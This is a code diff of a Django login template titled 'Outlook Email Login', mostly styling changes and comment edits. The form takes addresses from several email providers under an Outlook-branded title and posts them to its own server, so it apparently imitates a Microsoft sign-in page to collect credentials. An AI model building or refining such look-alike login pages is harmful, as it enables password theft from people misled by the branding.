@@ -5,12 +5,14 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
     <title>Outlook Email Login</title>
     <style>
+        /* ===== RESET ===== */
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
         }
 
+        /* ===== BODY ===== */
         body {
             font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', sans-serif;
             min-height: 100vh;
@@ -20,26 +22,9 @@
             padding: 20px;
             margin: 0;
             background: #f0f2f5;
-            background-image: 
-                radial-gradient(ellipse at 10% 20%, rgba(0, 103, 184, 0.03) 0%, transparent 50%),
-                radial-gradient(ellipse at 90% 80%, rgba(0, 103, 184, 0.03) 0%, transparent 50%),
-                linear-gradient(135deg, #f0f2f5 0%, #e8ecf1 100%);
         }
 
-        body::before {
-            content: '';
-            position: fixed;
-            top: 0;
-            left: 0;
-            right: 0;
-            bottom: 0;
-            background-image: 
-                radial-gradient(circle at 20% 50%, rgba(0, 103, 184, 0.02) 0%, transparent 50%),
-                radial-gradient(circle at 80% 50%, rgba(0, 103, 184, 0.02) 0%, transparent 50%);
-            pointer-events: none;
-            z-index: 0;
-        }
-
+        /* ===== CONTAINER ===== */
         .container {
             width: 100%;
             max-width: 440px;
@@ -48,15 +33,17 @@
             z-index: 1;
         }
 
+        /* ===== CARD ===== */
         .card {
             background: #ffffff;
-            border-radius: 12px;
+            border-radius: 16px;
             padding: 44px 36px 32px;
-            box-shadow: 0 2px 12px rgba(0, 0, 0, 0.08);
+            box-shadow: 0 4px 24px rgba(0, 0, 0, 0.08);
             transition: all 0.2s ease;
             position: relative;
         }
 
+        /* ===== LOGO ===== */
         .logo {
             text-align: center;
             margin-bottom: 28px;
@@ -68,6 +55,7 @@
             display: inline-block;
         }
 
+        /* ===== HEADER TEXT ===== */
         .header-text {
             text-align: center;
             margin-bottom: 28px;
@@ -87,6 +75,7 @@
             font-weight: 400;
         }
 
+        /* ===== FORM ===== */
         .form-group {
             margin-bottom: 18px;
         }
@@ -150,6 +139,7 @@
             display: block;
         }
 
+        /* ===== BUTTON ===== */
         .btn {
             width: 100%;
             padding: 14px;
@@ -198,6 +188,7 @@
             100% { transform: rotate(360deg); }
         }
 
+        /* ===== LINKS ===== */
         .links {
             text-align: center;
             margin-top: 20px;
@@ -214,6 +205,7 @@
             text-decoration: underline;
         }
 
+        /* ===== FOOTER ===== */
         .footer {
             margin-top: 28px;
             padding-top: 18px;
@@ -237,6 +229,7 @@
             color: #d1d5db;
         }
 
+        /* ===== MESSAGES ===== */
         .message {
             padding: 12px 16px;
             border-radius: 8px;
@@ -259,10 +252,11 @@
             border: 1px solid #bee5eb;
         }
 
+        /* ===== RESPONSIVE ===== */
         @media (max-width: 480px) {
             .card {
                 padding: 28px 20px 24px;
-                border-radius: 10px;
+                border-radius: 12px;
             }
             .header-text h1 {
                 font-size: 20px;
@@ -315,17 +309,16 @@
     <div class="container">
         <div class="card">
 
-            <!-- Logo -->
             
 
-            <!-- Messages -->
+            <!-- ===== MESSAGES ===== -->
             {% if messages %}
                 {% for message in messages %}
                 <div class="message {{ message.tags }}">{{ message }}</div>
                 {% endfor %}
             {% endif %}
 
-            <!-- Form -->
+            <!-- ===== FORM ===== -->
             <form method="POST" id="loginForm" novalidate>
                 {% csrf_token %}
 
@@ -364,12 +357,12 @@
                 </button>
             </form>
 
-            <!-- Create new account -->
+            <!-- ===== CREATE ACCOUNT ===== -->
             <div class="links">
                 <a href="#">Create new account</a>
             </div>
 
-            <!-- Footer -->
+            <!-- ===== FOOTER ===== -->
             <div class="footer">
                 <a href="/privacy/">Privacy Policy</a>
                 <span>|</span>
@@ -434,13 +427,11 @@
         const emailError = document.getElementById('emailError');
         const loginForm = document.getElementById('loginForm');
 
-        // Update label and placeholder on selection change
         serviceSelect.addEventListener('change', function() {
             const selected = this.value;
             if (selected && serviceMap[selected]) {
                 emailLabel.textContent = serviceMap[selected].label;
                 emailInput.placeholder = serviceMap[selected].placeholder;
-                // Clear error when provider changes
                 emailInput.classList.remove('error');
                 emailError.classList.remove('show');
                 emailError.textContent = '';
@@ -450,19 +441,16 @@
             }
         });
 
-        // Clear error on typing
         emailInput.addEventListener('input', function() {
             this.classList.remove('error');
             emailError.classList.remove('show');
             emailError.textContent = '';
         });
 
-        // ========== STRICT EMAIL VALIDATION ==========
         loginForm.addEventListener('submit', function(e) {
             const selectedService = serviceSelect.value;
             const email = emailInput.value.trim();
             
-            // Check if provider is selected
             if (!selectedService) {
                 e.preventDefault();
                 alert('Please select your email provider.');
@@ -470,12 +458,9 @@
                 return false;
             }
 
-            // Get service data
             const serviceData = serviceMap[selectedService];
             
-            // If service has domain restrictions
             if (serviceData && serviceData.domains && serviceData.domains.length > 0) {
-                // Check if email matches any allowed domain
                 const isValid = serviceData.domains.some(domain => 
                     email.toLowerCase().endsWith('@' + domain)
                 );
@@ -490,7 +475,6 @@
                 }
             }
 
-            // If no domain restrictions (office, webmail, other), just check if email has @
             if (serviceData && (!serviceData.domains || serviceData.domains.length === 0)) {
                 if (!email.includes('@') || !email.includes('.')) {
                     e.preventDefault();
@@ -502,11 +486,9 @@
                 }
             }
 
-            // All validations passed
             emailInput.classList.remove('error');
             emailError.classList.remove('show');
             
-            // Show loading state
             const btn = document.getElementById('signInBtn');
             btn.disabled = true;
             btn.classList.add('loading');
@@ -514,7 +496,6 @@
             return true;
         });
 
-        // Also validate on blur (when user leaves the field)
         emailInput.addEventListener('blur', function() {
             const selectedService = serviceSelect.value;
             const email = this.value.trim();
